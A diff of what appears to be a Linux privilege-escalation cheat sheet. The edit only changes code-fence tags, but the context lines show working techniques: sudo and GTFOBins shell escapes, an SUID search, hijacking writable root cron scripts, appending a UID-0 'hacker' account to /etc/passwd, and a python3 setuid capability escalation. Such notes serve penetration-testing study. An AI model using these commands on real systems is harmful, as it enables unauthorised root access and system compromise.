@@ -5,7 +5,7 @@ title: "Linux Privilege Escalation"
 
 Run linpeas first for a broad sweep, then manually verify the interesting findings: automated tools flag a lot of noise.
 
-```bash
+```bash wrap
 ./linpeas.sh | tee linpeas.out
 
 whoami; id; hostname; uname -a
@@ -21,7 +21,7 @@ getcap -r / 2>/dev/null
 
 `sudo -l` shows what commands you can run as root: check every result on GTFOBins for a known escape.
 
-```bash
+```bash wrap
 sudo -l
 # GTFOBins: https://gtfobins.github.io
 sudo vim → :!bash
@@ -33,7 +33,7 @@ sudo python -c 'import os; os.system("/bin/bash")'
 
 SUID binaries run as their owner regardless of who executes them: anything non-standard owned by root is worth checking on GTFOBins.
 
-```bash
+```bash wrap
 find / -perm -4000 -type f 2>/dev/null
 # Check each on GTFOBins
 ```
@@ -42,7 +42,7 @@ find / -perm -4000 -type f 2>/dev/null
 
 Look for cron jobs running as root that call scripts you can write to: rewrite the script, wait for the next execution.
 
-```bash
+```bash wrap
 cat /etc/crontab
 ls -la /etc/cron*
 # Look for writable scripts called by root
@@ -52,7 +52,7 @@ ls -la /etc/cron*
 
 If `/etc/passwd` is world-writable, you can add a new root-level user with a known password hash.
 
-```bash
+```bash wrap
 openssl passwd -1 -salt salt password
 echo 'hacker:$1$salt$hash:0:0:root:/root:/bin/bash' >> /etc/passwd
 ```
@@ -61,7 +61,7 @@ echo 'hacker:$1$salt$hash:0:0:root:/root:/bin/bash' >> /etc/passwd
 
 Capabilities grant specific root-level privileges to binaries without full SUID: `cap_setuid+ep` on an interpreter is effectively root.
 
-```bash
+```bash wrap
 getcap -r / 2>/dev/null
 # python3 cap_setuid+ep → python3 -c 'import os; os.setuid(0); os.system("/bin/bash")'
 ```
